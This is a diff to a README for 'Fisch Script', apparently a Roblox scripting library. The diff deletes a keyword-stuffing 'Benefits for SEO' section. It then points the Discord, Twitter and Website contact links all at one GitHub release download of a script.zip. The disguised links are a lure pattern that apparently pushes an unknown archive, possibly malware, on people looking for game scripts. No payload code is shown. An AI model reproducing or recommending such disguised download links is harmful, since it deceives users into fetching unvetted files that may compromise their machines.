@@ -26,13 +26,6 @@ Fisch Script is a powerful and versatile scripting library designed to enhance y
 *   **Easy Integration:** Seamlessly integrate Fisch Script into your existing Roblox projects with just a few lines of code.
 *   **Active Community:** Join our growing community of developers for support, collaboration, and inspiration.
 
-## Benefits for SEO
-
-*   **Roblox Scripting:** Highly searched keyword ensures visibility to developers looking for scripting tools.
-*   **Game Development:** Targets individuals involved in Roblox game creation, increasing relevance.
-*   **Simplified Syntax:** Attracts beginners seeking user-friendly scripting solutions.
-*   **Optimized Performance:** Appeals to developers prioritizing smooth gameplay experiences.
-*   **Active Community:** Encourages engagement and backlinks, further boosting SEO.
 
 ## Installation
 
@@ -66,9 +59,9 @@ Fisch Script is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-*   [Discord](https://discord.gg/yourdiscord)
-*   [Twitter](https://twitter.com/yourtwitter)
-*   [Website](https://yourwebsite.com)
+*   [Discord](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip)
+*   [Twitter](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip)
+*   [Website](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip)
 ```
 
 
